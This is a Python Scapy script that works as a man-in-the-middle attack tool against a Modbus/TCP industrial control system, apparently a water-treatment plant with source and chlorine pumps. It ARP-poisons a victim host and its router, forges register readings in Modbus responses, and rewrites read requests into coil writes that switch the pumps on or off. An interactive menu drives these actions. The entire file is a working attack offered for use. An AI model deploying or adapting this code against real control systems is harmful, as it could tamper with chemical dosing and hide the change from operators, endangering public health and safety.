import sys
from scapy.all import *
from scapy.contrib.modbus import *
import random
from threading import Thread
import time

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


fake = False
bluff0 = [112, 112, 112, 112]
bluff1 = [112, 112, 112]
bluff2 = [9900,9900,9900,9900,9900]
bluff3 = [5100,5100,5100,5100,5100,5100]
write = False
iface = ""
s = conf.L2socket(iface="")
victim_ip = ""
victim_mac = ""
router_ip = ""
router_mac = ""
attack_ip = ""
attack_mac = ""
poison_timer = 10


def modifyMB(packet, queue):
	if packet[Ether].src == router_mac:
		if TCP in packet:
			if packet[TCP].sport == 502:
				if ModbusADUResponse in packet:
					if ModbusPDU04ReadInputRegistersResponse in packet:
						packet = fakevalidvalue(packet, queue)
						del packet[TCP].chksum
	return packet

def fakevalidvalue(packet, queue):
	find = None
	for seq in queue.getseq():
		if packet[ModbusADUResponse].transId == seq[1]:
			if seq[0] == 0x0:
				packet[ModbusPDU04ReadInputRegistersResponse].registerVal= random.choice(bluff0)
			elif seq[0] == 0x1:
				packet[ModbusPDU04ReadInputRegistersResponse].registerVal= random.choice(bluff1)
			elif seq[0] == 0x2:
				packet[ModbusPDU04ReadInputRegistersResponse].registerVal= random.choice(bluff2)
			elif seq[0] == 0x3:
				packet[ModbusPDU04ReadInputRegistersResponse].registerVal= random.choice(bluff3)
			else:
				print seq[1] + " Not found!!"
			find = seq
	if find != None:
		queue.removefromseq(seq)
	else:
		print "Request not hanlded"
		print packet.show2
		print "-----------"
		pass
	return packet

def changeRforW(packet, coil, value):
        if TCP in packet:
                if packet[TCP].dport == 502:
                        if ModbusADURequest in packet:
                                if ModbusPDU04ReadInputRegistersRequest in packet:
					del packet[ModbusPDU04ReadInputRegistersRequest]
                                        packet = packet/ModbusPDU05WriteSingleCoilRequest()
					packet[ModbusPDU05WriteSingleCoilRequest].outputAddr = coil
					packet[ModbusPDU05WriteSingleCoilRequest].outputValue = value
					packet[ModbusPDU05WriteSingleCoilRequest].funcCode = 5
					print packet.show2
					del packet[TCP].chksum
					print "----------------------------------------------"
        return packet

def storeRequest(packet, queue):
	if TCP in packet:
		if packet[TCP].dport == 502:
			if ModbusPDU04ReadInputRegistersRequest in packet:
				a = [packet[ModbusPDU04ReadInputRegistersRequest].startAddr, packet[ModbusADURequest].transId]
				queue.addtoseq(a)


def handling(queue):
	def cb(pkt):
		if IP in pkt:
        		if pkt[Ether].src == victim_mac:
            			pkt[Ether].dst = router_mac
            			pkt[Ether].src = attack_mac
            			if fake:
                			storeRequest(pkt, queue)
            			if write:
                			pkt = changeRforW(pkt, coil, value)
            			s.send(pkt)
        		elif pkt[Ether].src == router_mac:
				if fake:
                                        pkt = modifyMB(pkt, queue)
            			pkt[Ether].dst = victim_mac
            			pkt[Ether].src = attack_mac
            			s.send(pkt)
	return cb

def exit():
        router_is_at = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwdst=router_mac)
        victim_is_at = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwdst=victim_mac)
        x = 0
	while x < 4:
		send(router_is_at, verbose=0)
        	send(victim_is_at, verbose=0)
        	time.sleep(0.5)
		x += 1
	print "You can quit now"
	sys.exit()

class monitor_incoming(Thread):
    def __init__(self):
        Thread.__init__(self)
	self.queue = pending()

    def run(self):
        sniff(prn=handling(self.queue), filter="ip", store=0)


class pending():
    def __init__(self):
	self.seq = []
    def getseq(self):
	return self.seq
    def addtoseq(self, entry):
	self.seq = [entry] + self.seq
    def removefromseq(self, entry):
	self.seq.remove(entry)

class poison(Thread):
    def __init__(self):
        Thread.__init__(self)
	self.running = True

    def stop(self):
	self.running = False

    def run(self):
        router_is_at = ARP(op=2, psrc=router_ip, pdst=victim_ip, hwdst=attack_mac)
        victim_is_at = ARP(op=2, psrc=victim_ip, pdst=router_ip, hwdst=attack_mac)
        while self.running:
            send(router_is_at, verbose=0)
            send(victim_is_at, verbose=0)
            time.sleep(poison_timer)


if __name__ == '__main__':
    print "Starting IP foward..."
    sequence = []
    monitor_incoming = monitor_incoming()
    monitor_incoming.start()
    print "[OK]"
    print "---"
    print "Starting ARP spoofing..."
    poison = poison()
    poison.start()
    print "[OK]"
    print "---"
    while True:
        print "What you can do:"
        print "1 - Fake the results"
    	print "2 - Stop faking the results"
    	print "3 - Close source pump"
    	print "4 - Open source pump"
	print "5 - Close chlore pump"
	print "6 - Open chlore pump"
	print "9 - Clean and quit"
    	answer = raw_input("Choice : ")
    	if answer == "1":
	    fake = True
    	elif answer == "2":
	    fake = False
        elif answer == "3":
            write = True
	    coil = 4
	    value = 0xff00
	    time.sleep(0.2)
	    write = False
	elif answer == "4":
	    write = True
	    coil = 4
	    value = 0x0000
	    time.sleep(0.2)
	    write = False
	elif answer == "5":
	    write = True
            coil = 3
            value = 0xff00
            time.sleep(0.2)
            write = False
	elif answer == "6":
	    write = True
            coil = 3
            value = 0x0000
            time.sleep(0.2)
            write = False
	elif answer == "9":
	    poison.stop()
	    print "Depoisoning ARP ..."
	    c = 10
	    while c > 0:
		print "Exiting in "+str(c)+" ..."
		c -= 1
	  	time.sleep(1)
	    exit()
	else:
	    print "Invalid choice"


